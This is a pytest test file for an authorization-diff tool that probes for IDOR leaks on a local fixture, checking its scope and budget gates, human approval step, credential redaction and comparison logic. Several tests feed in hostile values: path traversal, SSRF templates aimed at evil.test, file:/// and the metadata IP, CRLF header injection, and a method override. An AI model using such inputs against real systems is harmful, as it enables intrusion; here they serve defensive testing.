"""P3-VALAUTHZ: owner-fetch-and-compare oracle + two-step replay (authz_diff.py).

Two layers: black-box tests against the real loopback authz_target fixture
(vulnerable AND patched, through the real http_probe.fetch), and scripted
fetch_fn tests for the branches a fixture cannot reach deterministically
(unstable owner baseline, shared authenticated content, gate/scope/budget
stops). The fixture's ground truth is independent of authz_diff.
"""
import json
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "mcp-servers"))
sys.path.insert(0, os.path.join(ROOT, "tests", "fixtures", "authz_target"))

import authz_diff  # noqa: E402
import scope_guard  # noqa: E402
from authz_app import ALICE, BOB, AuthzApp  # noqa: E402
from budget_guard import BudgetExceeded  # noqa: E402
from http_probe import FetchResult  # noqa: E402

OWNER = {"Authorization": f"Bearer {ALICE}"}
OTHER = {"Authorization": f"Bearer {BOB}"}


@pytest.fixture
def vulnerable_app():
    app = AuthzApp(mode="vulnerable").start()
    yield app
    app.stop()


@pytest.fixture
def patched_app():
    app = AuthzApp(mode="patched").start()
    yield app
    app.stop()


def _wf(app, carried_path, step2, **kw):
    return authz_diff.Workflow(
        step1_url=f"{app.base_url}/authz/refs", carried_path=carried_path,
        step2_url_template=f"{app.base_url}{step2}", **kw)


def _cart(app, **kw):
    return _wf(app, "cart_ref", "/authz/carts/{carried}/invoice", **kw)


# --- black-box against the real fixture ----------------------------------

def test_multistep_carried_id_is_leaked_in_vulnerable_mode(vulnerable_app):
    r = authz_diff.run_two_step(_cart(vulnerable_app), OWNER, OTHER)
    assert r.verdict == "LEAKED", r.detail
    assert r.carried_id == "ck-7f3a91"
    assert len(r.requests) == 7


def test_multistep_carried_id_is_protected_in_patched_mode(patched_app):
    r = authz_diff.run_two_step(_cart(patched_app), OWNER, OTHER)
    assert r.verdict == "PROTECTED", r.detail
    assert len(r.requests) == 3  # stops as soon as the verdict is decided


def test_single_step_order_matches_the_existing_sweeps_verdict(vulnerable_app, patched_app):
    assert authz_diff.run_two_step(
        _wf(vulnerable_app, "order_id", "/authz/orders/{carried}"), OWNER, OTHER).verdict == "LEAKED"
    assert authz_diff.run_two_step(
        _wf(patched_app, "order_id", "/authz/orders/{carried}"), OWNER, OTHER).verdict == "PROTECTED"


def test_public_resource_is_not_reported_in_either_mode(vulnerable_app, patched_app):
    for app in (vulnerable_app, patched_app):
        r = authz_diff.run_two_step(_wf(app, "catalog_ref", "/authz/catalog/{carried}"), OWNER, OTHER)
        assert r.verdict == "PUBLIC", r.detail


def test_caller_scoped_view_is_not_reported_in_either_mode(vulnerable_app, patched_app):
    for app in (vulnerable_app, patched_app):
        r = authz_diff.run_two_step(_wf(app, "profile_ref", "/authz/profiles/{carried}"), OWNER, OTHER)
        assert r.verdict == "DIFFERENT", r.detail


def test_soft_deny_with_http_200_is_not_reported_in_either_mode(vulnerable_app, patched_app):
    for app in (vulnerable_app, patched_app):
        r = authz_diff.run_two_step(_wf(app, "note_ref", "/authz/notes/{carried}"), OWNER, OTHER)
        assert r.verdict == "DIFFERENT", r.detail


def test_existing_sweep_fuzzy_ratio_false_leaks_the_caller_scoped_view(vulnerable_app):
    """Characterization of WHY the oracle is exact-compare: idor_sweep's
    difflib ratio calls B's OWN profile a leak of A's."""
    sys.path.insert(0, os.path.join(ROOT, "mcp-servers", "idor-mcp"))
    import idor_sweep
    ref = "pr-a11ce0"
    res = idor_sweep.sweep_idor(
        f"{vulnerable_app.base_url}/authz/profiles/{{id}}", [ref],
        owner_bearer_token=ALICE, other_bearer_token=BOB)
    assert res.verdicts[0].verdict == "LEAKED"


def test_every_request_is_a_get_by_default_and_never_mutates(vulnerable_app):
    authz_diff.run_two_step(_cart(vulnerable_app), OWNER, OTHER)
    assert {e["method"] for e in vulnerable_app.request_log} == {"GET"}
    assert vulnerable_app.mutation_count == 0


def test_result_never_contains_credentials(vulnerable_app):
    r = authz_diff.run_two_step(_cart(vulnerable_app), OWNER, OTHER)
    blob = json.dumps(r.to_dict())
    assert ALICE not in blob and BOB not in blob and "Bearer" not in blob


# --- human gate for state-changing methods --------------------------------

def test_state_changing_step_is_refused_with_zero_requests_without_approval(vulnerable_app):
    wf = _cart(vulnerable_app, step2_method="POST")
    r = authz_diff.run_two_step(wf, OWNER, OTHER)
    assert r.verdict == "BLOCKED" and "non-idempotent" in r.detail
    assert vulnerable_app.request_log == [] and vulnerable_app.mutation_count == 0


def test_state_changing_step_with_malformed_approval_is_still_refused(vulnerable_app):
    wf = _wf(vulnerable_app, "cart_ref", "/authz/carts/{carried}/cancel", step2_method="POST")
    for bad in ({}, {"methods": ["POST"]}, {"methods": ["GET"], "reason": "x", "authorized_by": "y"}):
        r = authz_diff.run_two_step(wf, OWNER, OTHER, approval=bad)
        assert r.verdict == "BLOCKED"
    assert vulnerable_app.request_log == []


def test_state_changing_step_proceeds_only_with_a_valid_human_approval(vulnerable_app):
    wf = _wf(vulnerable_app, "cart_ref", "/authz/carts/{carried}/cancel", step2_method="POST")
    ok = {"methods": ["POST"], "reason": "fixture", "authorized_by": "human"}
    r = authz_diff.run_two_step(wf, OWNER, OTHER, approval=ok)
    assert r.verdict != "BLOCKED"
    assert any(e["method"] == "POST" for e in vulnerable_app.request_log)


# --- scripted branches ----------------------------------------------------

class Script:
    """fetch_fn keyed by (identity, url); records every call + kwargs."""

    def __init__(self, table, default=None):
        self.table, self.default, self.calls = table, default, []

    def __call__(self, url, method, headers, body, timeout_s, *, allow_redirects=True):
        cred = headers.get("Authorization") or headers.get("Cookie")
        who = {"Bearer o": "owner", "Bearer b": "other", "sid=o": "owner", "sid=b": "other",
               "Bearer opaquetok-123456": "owner",
               "theme=darkmode; sid=SECRETSESSIONVALUE": "owner",
               "PHPSESSID=SESSVALUE123456; theme=darkmode": "owner"}.get(cred, "none")
        self.calls.append({"who": who, "url": url, "method": method, "allow_redirects": allow_redirects,
                           "body": body, "headers": dict(headers)})
        out = self.table.get((who, url), self.default)
        if callable(out):
            out = out(len([c for c in self.calls if c["who"] == who and c["url"] == url]))
        return out


S1, S2 = "http://127.0.0.1:9/a/refs", "http://127.0.0.1:9/a/obj/{carried}"
S2_A = "http://127.0.0.1:9/a/obj/ref-A"
S2_B = "http://127.0.0.1:9/a/obj/ref-B"
O = {"Authorization": "Bearer o"}
B = {"Authorization": "Bearer b"}
WF = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2)


def _ok(body):
    return FetchResult(status=200, body=body)


def _step1(ref):
    return _ok(json.dumps({"items": [{"ref": ref}]}))


def _run(table, **kw):
    s = Script(table, default=FetchResult(status=500, body=""))
    return authz_diff.run_two_step(WF, O, B, fetch_fn=s, **kw), s


def test_dead_owner_baseline_is_reported_as_such_never_as_a_leak():
    r, _ = _run({("owner", S1): FetchResult(status=401, body="")})
    assert r.verdict == "BASELINE_FAILED"
    r, _ = _run({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok("   ")})
    assert r.verdict == "BASELINE_FAILED"


def test_unstable_owner_baseline_is_inconclusive_not_a_leak():
    flip = lambda n: _ok('{"v": %d, "name": "alpha"}' % n)  # noqa: E731 -- body differs on every owner fetch
    r, _ = _run({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): flip,
        ("other", S2_A): _ok('{"v": 1, "name": "alpha"}'),
    })
    assert r.verdict == "INCONCLUSIVE" and "unstable" in r.detail


def test_authenticated_but_global_content_is_not_a_leak():
    same = _ok('{"banner": "welcome", "tier": "gold"}')
    r, _ = _run({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): same, ("other", S2_A): same,
        ("none", S2_A): FetchResult(status=401, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): same,
    })
    assert r.verdict == "SHARED", r.detail


def test_json_key_order_and_whitespace_do_not_hide_a_real_leak():
    a, b = _ok('{"x": 1, "y": [1, 2]}'), _ok('{\n "y": [1,2],\n "x": 1 }')
    r, _ = _run({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): a, ("other", S2_A): b,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"x": 2}'),
    })
    assert r.verdict == "LEAKED", r.detail


def test_a_missing_control_degrades_to_inconclusive_never_to_leaked():
    # unauth control errors out -> cannot rule out "public" -> must not report LEAKED
    r, _ = _run({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok('{"x": 1}'),
        ("other", S2_A): _ok('{"x": 1}'),
        ("none", S2_A): FetchResult(status=None, body="", error="timeout"),
    })
    assert r.verdict == "INCONCLUSIVE"


def test_redirects_are_never_followed():
    r, s = _run({("owner", S1): FetchResult(status=401, body="")})
    assert s.calls and all(c["allow_redirects"] is False for c in s.calls)


# --- scope / budget on every request --------------------------------------

def test_out_of_scope_step_url_sends_nothing(monkeypatch):
    monkeypatch.setattr(scope_guard, "load_engagement",
                        lambda path=None: scope_guard.Engagement(target="x", in_scope=["only.invalid"]))
    wf = authz_diff.Workflow(step1_url="http://target.invalid/refs", carried_path="r",
                             step2_url_template="http://target.invalid/o/{carried}")
    s = Script({})
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "BLOCKED" and "scope" in r.detail.lower()
    assert s.calls == []


def test_scope_is_checked_on_every_single_request():
    seen = []

    def scope(url):
        seen.append(url)
        if len(seen) == 3:
            raise authz_diff.RequestBlocked("scope: third request denied")

    r, s = _run({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok('{"x": 1}')}, scope_check=scope)
    assert r.verdict == "BLOCKED" and r.verdict != "LEAKED"
    assert len(seen) == 3 and len(s.calls) == 2  # the denied request was never sent


def test_metadata_ip_is_refused_by_the_default_scope_check():
    wf = authz_diff.Workflow(step1_url="http://169.254.169.254/refs", carried_path="r",
                             step2_url_template="http://169.254.169.254/o/{carried}")
    s = Script({})
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "BLOCKED" and s.calls == []


def test_budget_is_consumed_per_request_and_exhaustion_stops_the_run():
    n = []

    def budget():
        n.append(1)
        if len(n) > 2:
            raise BudgetExceeded("cap")

    r, s = _run({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok('{"x": 1}')}, budget_cb=budget)
    assert r.verdict == "BLOCKED" and "budget" in r.detail.lower()
    assert len(s.calls) == 2


# --- workflow / carried-id validation (SSRF + traversal hardening) ---------

@pytest.mark.parametrize("evil", ["../admin", "..", "a/b", "x@evil.com", "a b", "a?b=1", "a#b", "", "%2e%2e"])
def test_hostile_carried_id_values_are_refused_before_use(evil):
    r, s = _run({("owner", S1): _step1(evil)})
    assert r.verdict == "ERROR" and len(s.calls) == 1  # only step 1 was ever sent


@pytest.mark.parametrize("tmpl", [
    "http://{carried}.evil.test/x",              # placeholder in host
    "http://127.0.0.1:9/a/obj/no-placeholder",   # no placeholder
    "http://127.0.0.1:9/{carried}/{carried}",    # two placeholders
    "http://other-host.test:9/a/obj/{carried}",  # different origin than step 1
    "file:///etc/{carried}",
])
def test_unsafe_step2_templates_are_refused_with_zero_requests(tmpl):
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=tmpl)
    s = Script({})
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict in ("ERROR", "BLOCKED") and s.calls == []


def test_extract_carried_id_walks_dotted_paths_and_list_indexes():
    assert authz_diff.extract_carried_id('{"a": {"b": [{"c": "v1"}]}}', "a.b.0.c") == "v1"
    assert authz_diff.extract_carried_id('{"n": 42}', "n") == "42"
    for body, path in (("not json", "a"), ('{"a": 1}', "b"), ('{"a": [1]}', "a.5"),
                       ('{"a": {"x": 1}}', "a"), ('{"a": true}', "a")):
        assert authz_diff.extract_carried_id(body, path) is None


# --- review-fix round: method gate, replays, verdict typing, hardening ------

@pytest.mark.parametrize("who", ["owner", "other"])
def test_method_override_header_on_an_identity_is_refused_like_the_real_verb(who):
    owner = dict(O, **{"X-HTTP-Method-Override": "DELETE"}) if who == "owner" else O
    other = dict(B, **{"X-HTTP-Method-Override": "DELETE"}) if who == "other" else B
    s = Script({})
    r = authz_diff.run_two_step(WF, owner, other, fetch_fn=s)
    assert r.verdict == "BLOCKED" and s.calls == []


def test_the_authorized_verb_is_exactly_the_verb_sent():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2,
                             step1_method=" get", step2_method="Get ")
    s = Script({("owner", S1): FetchResult(status=401, body="")}, default=FetchResult(status=500, body=""))
    authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert [c["method"] for c in s.calls] == ["GET"]


def test_an_approved_state_changing_step_is_never_replayed_or_sent_unauthenticated():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2,
                             step2_method="POST")
    ok = {"methods": ["POST"], "reason": "r", "authorized_by": "h"}
    same = _ok('{"x": 1}')
    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): same, ("other", S2_A): same},
               default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s, approval=ok)
    posts = [c for c in s.calls if c["method"] == "POST"]
    assert [c["who"] for c in posts] == ["owner", "other"]  # one each, no replicate, no unauth control
    assert r.verdict == "INCONCLUSIVE" and "state-changing" in r.detail


def test_approved_state_changing_run_against_the_fixture_sends_no_unauthenticated_post(vulnerable_app):
    wf = _wf(vulnerable_app, "cart_ref", "/authz/carts/{carried}/cancel", step2_method="POST")
    ok = {"methods": ["POST"], "reason": "fixture", "authorized_by": "human"}
    authz_diff.run_two_step(wf, OWNER, OTHER, approval=ok)
    posts = [e for e in vulnerable_app.request_log if e["method"] == "POST"]
    assert len(posts) == 2 and all(p["authorization"] for p in posts)


def test_gate_refusal_stays_blocked_even_if_the_refusal_wording_changes(monkeypatch):
    monkeypatch.setattr(authz_diff, "check_request_allowed", lambda *a, **k: "nope, not allowed")
    s = Script({})
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "BLOCKED" and s.calls == []


def test_a_structurally_bad_workflow_is_error_not_blocked():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="x", step2_url_template="http://127.0.0.1:9/no-placeholder")
    assert authz_diff.run_two_step(wf, O, B, fetch_fn=Script({})).verdict == "ERROR"


def test_an_exception_from_fetch_becomes_error_with_the_request_log_kept():
    def boom(url, method, headers, body, timeout_s, *, allow_redirects=True):
        raise ValueError("URL can't contain control characters")

    r = authz_diff.run_two_step(WF, O, B, fetch_fn=boom)
    assert r.verdict == "ERROR" and "control characters" in r.detail


@pytest.mark.parametrize("evil", [".", "~", "-x", ".hidden", "_a"])
def test_carried_ids_must_start_alphanumeric(evil):
    r, s = _run({("owner", S1): _step1(evil)})
    assert r.verdict == "ERROR" and len(s.calls) == 1


def test_engagement_is_resolved_once_per_run_not_per_request(monkeypatch):
    loads = []

    def counting(path=None):
        loads.append(1)
        return scope_guard.Engagement(target="x")

    monkeypatch.setattr(scope_guard, "load_engagement", counting)
    same = _ok('{"x": 1, "name": "alpha"}')
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): same, ("other", S2_A): same,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"x": 2, "name": "bravo"}'),
    })
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED" and len(s.calls) == 7
    assert len(loads) == 1


def test_an_unreadable_engagement_fails_closed_with_zero_requests(monkeypatch):
    def broken(path=None):
        raise RuntimeError("yaml exploded")

    monkeypatch.setattr(scope_guard, "load_engagement", broken)
    s = Script({})
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "BLOCKED" and s.calls == []


def test_evidence_redacts_secret_named_json_fields_and_url_secrets_but_keeps_the_proof():
    body = '{"owner": "alice", "payment_token": "tok_live_abcdef123456", "nested": [{"api_key": "sk_live_zzzzzzzz1234"}]}'
    url1 = S1 + "?access_token=SECRETVALUE123"
    wf = authz_diff.Workflow(step1_url=url1, carried_path="items.0.ref", step2_url_template=S2)
    s = Script({
        ("owner", url1): _step1("ref-A"), ("owner", S2_A): _ok(body), ("other", S2_A): _ok(body),
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", url1): _step1("ref-B"), ("other", S2_B): _ok('{"owner": "bobby"}'),
    })
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    blob = json.dumps(r.to_dict())
    for secret in ("tok_live_abcdef123456", "sk_live_zzzzzzzz1234", "SECRETVALUE123"):
        assert secret not in blob
    assert '"alice"' in r.evidence["owner_view"] or "alice" in r.evidence["owner_view"]
    assert "[REDACTED" in r.evidence["owner_view"]


# --- second review round: robustness, credential echo, key matching ---------

def test_deeply_nested_target_json_cannot_abort_the_run():
    deep = "[" * 100000
    r, _ = _run({("owner", S1): _ok(deep)})
    assert r.verdict == "ERROR" and "no usable carried id" in r.detail
    same = _ok(deep)
    r, _ = _run({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): same, ("other", S2_A): same,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"x": 2}'),
    })
    assert r.verdict in ("LEAKED", "ERROR", "INCONCLUSIVE")  # any verdict -- but never an exception


def test_unredactable_nested_body_is_withheld_not_stored_raw():
    secret = "tok_live_abcdef123456"
    deep = '{"a":' * 100000 + '{"payment_token":"' + secret + '"}' + "}" * 100000
    assert secret not in authz_diff.redact_body(deep)


def test_unicode_digit_path_segment_does_not_raise():
    assert authz_diff.extract_carried_id('{"a": [1]}', "a.²") is None


@pytest.mark.parametrize("which", ["scope", "budget"])
def test_a_gate_callback_crash_fails_closed_as_blocked_with_nothing_sent(which):
    def crash(*a):
        raise OSError("disk full")

    s = Script({("owner", S1): _step1("ref-A")})
    kw = {"scope_check": crash} if which == "scope" else {"budget_cb": lambda: crash()}
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s, **kw)
    assert r.verdict == "BLOCKED" and s.calls == []


def test_an_unexpected_internal_error_becomes_error_with_the_log_kept():
    calls = []

    def odd(url, method, headers, body, timeout_s, *, allow_redirects=True):
        calls.append(url)
        return None  # not a FetchResult -> AttributeError inside the run

    r = authz_diff.run_two_step(WF, O, B, fetch_fn=odd)
    assert r.verdict == "ERROR" and calls == [S1]


def test_credentials_with_control_characters_are_rejected_before_any_request():
    token = "opaqueSECRET123"
    s = Script({})
    r = authz_diff.run_two_step(WF, {"Authorization": f"Bearer {token}\r\nX-Evil: 1"}, B, fetch_fn=s)
    assert r.verdict == "ERROR" and s.calls == [] and token not in r.detail


def test_exception_text_never_echoes_a_credential():
    token = "opaqueSECRET123"

    def boom(url, method, headers, body, timeout_s, *, allow_redirects=True):
        raise ValueError(f"Invalid header value b'Bearer {token}'")

    r = authz_diff.run_two_step(WF, {"Authorization": f"Bearer {token}"}, B, fetch_fn=boom)
    assert r.verdict == "ERROR" and token not in json.dumps(r.to_dict())


@pytest.mark.parametrize("key", ["payment_token", "accessToken", "api_key", "apiKey", "X-Api-Key", "password",
                                 "passwords", "session_id", "authToken", "refresh_token", "client_secret",
                                 "Authorization", "pin", "otp", "cvv", "Cookie"])
def test_secret_looking_json_keys_are_redacted(key):
    assert "VALUE123456" not in authz_diff.redact_body(json.dumps({key: "VALUE123456"}))


@pytest.mark.parametrize("key", ["shipping_address", "mapping", "author", "authorized_at", "spinner",
                                 "options", "photo", "owner", "total", "items", "status", "email"])
def test_ordinary_json_keys_keep_their_proof_value(key):
    assert "VALUE123456" in authz_diff.redact_body(json.dumps({key: "VALUE123456"}))


# --- third round: CEM candidate conditions, volatile-field tolerance --------

def _leak_table(owner_body, other_body, own_b_body, unauth=None, owner2_body=None, oh="o", bh="b"):
    t = {
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): owner_body, ("other", S2_A): other_body,
        ("none", S2_A): unauth or FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): own_b_body,
    }
    return t


def test_leaked_evidence_names_the_swapped_credential_header_as_a_cem_candidate_condition():
    same = _ok('{"x": 1, "name": "alpha"}')
    s = Script(_leak_table(same, same, _ok('{"x": 2, "name": "bravo"}')), default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED"
    assert r.evidence["cem_candidate_conditions"] == [
        {"name": "Authorization", "category": "header", "perturbation": {"drop": True}}]
    assert "baseline_value" not in r.evidence["cem_candidate_conditions"][0]  # never a credential value


def test_cookie_identities_yield_a_cookie_header_condition_and_no_value():
    oc, bc = {"Cookie": "sid=o"}, {"Cookie": "sid=b"}
    same = _ok('{"x": 1, "name": "alpha"}')
    s = Script(_leak_table(same, same, _ok('{"x": 2, "name": "bravo"}')), default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, oc, bc, fetch_fn=s)
    assert r.verdict == "LEAKED"
    conds = r.evidence["cem_candidate_conditions"]
    assert [(c["name"], c["category"]) for c in conds] == [("Cookie", "header")]
    assert "sid=" not in json.dumps(r.to_dict())


def _vol(n, **extra):
    return {"cart": "ck-1", "owner": "alice", "total": "149.00", "generated_at": f"t{n}", "request_id": f"r{n}", **extra}


def _volatile_script(other_body, own_b_body, unauth=None):
    counter = {"owner": 0}

    def owner_s2(n):
        return _ok(json.dumps(_vol(n)))

    return Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): owner_s2, ("other", S2_A): other_body,
        ("none", S2_A): unauth or FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): own_b_body,
    }, default=FetchResult(status=500, body=""))


def test_a_real_leak_is_still_found_when_the_body_carries_per_request_fields():
    s = _volatile_script(_ok(json.dumps(_vol(99))), _ok(json.dumps(_vol(7, owner="bobby", cart="ck-2"))))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "LEAKED", r.detail
    assert sorted(r.evidence["masked_paths"]) == ["/generated_at", "/request_id"]
    assert len(r.requests) == 7


def test_a_soft_deny_with_per_request_fields_is_still_not_a_leak():
    deny = _ok(json.dumps({"error": "not_yours", "generated_at": "t99", "request_id": "r99"}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_volatile_script(deny, _ok("{}")))
    assert r.verdict == "DIFFERENT", r.detail


def test_a_body_that_is_all_volatile_fields_cannot_be_called_a_leak():
    def allvol(n):
        return _ok(json.dumps({"t": n, "r": f"x{n}"}))

    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): allvol,
                ("other", S2_A): _ok(json.dumps({"t": 99, "r": "x99"}))}, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "INCONCLUSIVE" and "stable" in r.detail


def test_a_non_json_body_that_differs_is_not_masked():
    def text(n):
        return _ok(f"hello world {n}")

    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): text,
                ("other", S2_A): _ok("hello world 99")}, default=FetchResult(status=500, body=""))
    assert authz_diff.run_two_step(WF, O, B, fetch_fn=s).verdict == "DIFFERENT"


def test_public_resource_with_per_request_fields_is_still_recognized_as_public():
    pub = _ok(json.dumps(_vol(50)))
    s = _volatile_script(_ok(json.dumps(_vol(99))), _ok("{}"), unauth=pub)
    assert authz_diff.run_two_step(WF, O, B, fetch_fn=s).verdict == "PUBLIC"


def test_a_stable_different_body_costs_one_extra_request_not_a_masked_comparison():
    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok('{"x": 1}'),
                ("other", S2_A): _ok('{"x": 2}')}, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "DIFFERENT" and len(r.requests) == 4


def test_state_changing_differing_body_is_never_refetched():
    wf = authz_diff.Workflow(step1_url=S1, carried_path="items.0.ref", step2_url_template=S2, step2_method="POST")
    ok = {"methods": ["POST"], "reason": "r", "authorized_by": "h"}
    s = Script({("owner", S1): _step1("ref-A"), ("owner", S2_A): _ok('{"x": 1}'),
                ("other", S2_A): _ok('{"x": 2}')}, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(wf, O, B, fetch_fn=s, approval=ok)
    assert r.verdict == "DIFFERENT" and [c["who"] for c in s.calls if c["method"] == "POST"] == ["owner", "other"]


def test_authenticated_global_content_with_per_request_fields_is_shared_not_leaked():
    """Mutant guard: the other identity's OWN-object control must be compared with the same
    per-request fields masked, or this global (everyone sees the same stable data) body would be
    reported as LEAKED just because the two fetches carry different timestamps."""
    ticks = iter(range(1000))

    def glob(_n):  # every fetch by anyone gets a fresh per-request field
        return _ok(json.dumps({"banner": "hello", "tier": "gold", "generated_at": f"t{next(ticks)}"}))

    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): glob, ("other", S2_A): glob,
        ("none", S2_A): FetchResult(status=401, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): glob,
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=s)
    assert r.verdict == "SHARED", r.detail


# --- third review round: masking must never widen what counts as "equal" ----

def _masked_leak_table(owner_fn, other_body, own_b_body):
    return Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): owner_fn, ("other", S2_A): other_body,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): own_b_body,
    }, default=FetchResult(status=500, body=""))


def test_masking_does_not_equate_an_emptied_container_with_the_owners_populated_one():
    owner = lambda n: _ok(json.dumps({"id": "X", "type": "cart", "items": [{"sku": f"s{n}"}]}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "type": "cart", "items": []}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_masking_does_not_equate_a_slash_in_a_key_with_nesting():
    owner = lambda n: _ok(json.dumps({"a/b": 1, "x": 1, "y": 2, "t": n}))  # noqa: E731
    other = _ok(json.dumps({"a": {"b": 1}, "x": 1, "y": 2, "t": 99}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_a_volatile_field_the_owner_always_has_must_also_be_present_in_the_other_body():
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "meta": {"ts": f"t{n}"}}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1}))  # same stable data, but the always-present field is gone
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_a_volatile_field_must_keep_the_same_json_type_in_the_other_body():
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "ts": f"t{n}"}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "ts": {"nested": True}}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_cem_candidate_conditions_list_only_credential_headers():
    same = _ok('{"x": 1, "name": "alpha"}')
    other = {"Authorization": "Bearer b", "X-Forwarded-For": "1.2.3.4"}
    s = Script(_leak_table(same, same, _ok('{"x": 2, "name": "bravo"}')), default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, O, other, fetch_fn=s)
    assert r.verdict == "LEAKED"
    assert [c["name"] for c in r.evidence["cem_candidate_conditions"]] == ["Authorization"]


def test_stored_evidence_never_contains_the_exact_credential_even_under_an_innocent_key():
    token = "opaquetok-123456"
    body = _ok(json.dumps({"id": "X", "k": 1, "debug": f"seen {token}"}))
    s = Script({
        ("owner", S1): _step1("ref-A"), ("owner", S2_A): body, ("other", S2_A): body,
        ("none", S2_A): FetchResult(status=403, body=""),
        ("other", S1): _step1("ref-B"), ("other", S2_B): _ok('{"id": "Y"}'),
    }, default=FetchResult(status=500, body=""))
    r = authz_diff.run_two_step(WF, {"Authorization": f"Bearer {token}"}, B, fetch_fn=s)
    # the Script keys identities by the literal header, so re-key it for this token
    assert token not in json.dumps(r.to_dict())


def test_masking_keeps_an_empty_container_the_owner_has_as_required_content():
    """Mutant guard: with a per-request field in play, an empty list/dict the owner always returns
    must still be there in the other body (not silently dropped from the comparison)."""
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "tags": [], "t": f"t{n}"}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "t": "t99"}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_a_volatile_scalar_that_changes_json_type_in_the_other_body_is_not_equal():
    """Mutant guard for the type check itself (the path still exists, only its type differs)."""
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "ts": f"t{n}"}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "ts": 12345}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
    assert r.verdict == "DIFFERENT", r.detail


def test_masking_keeps_an_empty_object_the_owner_has_as_required_content():
    owner = lambda n: _ok(json.dumps({"id": "X", "k": 1, "extra": {}, "t": f"t{n}"}))  # noqa: E731
    other = _ok(json.dumps({"id": "X", "k": 1, "t": "t99"}))
    r = authz_diff.run_two_step(WF, O, B, fetch_fn=_masked_leak_table(owner, other, _ok('{"id": "Y"}')))
